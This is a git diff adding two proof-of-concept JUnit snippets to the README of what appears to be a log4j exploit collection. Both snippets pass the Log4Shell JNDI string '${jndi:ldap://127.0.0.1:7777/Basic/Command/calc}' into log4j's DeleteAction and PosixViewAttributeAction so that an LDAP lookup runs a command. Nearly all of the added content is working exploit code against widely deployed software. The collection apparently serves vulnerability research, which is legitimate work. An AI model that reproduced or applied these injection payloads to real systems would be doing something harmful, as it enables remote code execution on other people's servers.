@@ -111,3 +111,25 @@ This projects is a poc list for *log4j* java library, which extends default poc 
 ```
 
 ## Pocs for Action Tree ##
+
+**DeleteAction.execute()**
+
+```
+@Test
+    public void executeDeleteActionTest() {
+        DeleteAction action = DeleteAction.createDeleteAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", false, 1, true, null , new PathCondition[]{
+                IfFileName.createNameCondition(String.format("%s-*.log.zip", "appname"), null, IfAccumulatedFileCount.createFileCountCondition(1))
+        }, null, new DefaultConfiguration());
+    }
+```
+
+**PosixViewAttributeAction.execute()**
+```
+  @Test
+    public void executePosixViewAttributeAction() throws IOException {
+     PosixViewAttributeAction action = PosixViewAttributeAction.newBuilder().withPathConditions(new PathCondition[]{
+            IfFileName.createNameCondition(String.format("%s-*.log.zip", "appname"), null, IfAccumulatedFileCount.createFileCountCondition(1))
+        }).withFilePermissionsString("rwxrwxrwx").withBasePath("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}").withConfiguration(new DefaultConfiguration()).build();
+        action.execute();
+    }
+```
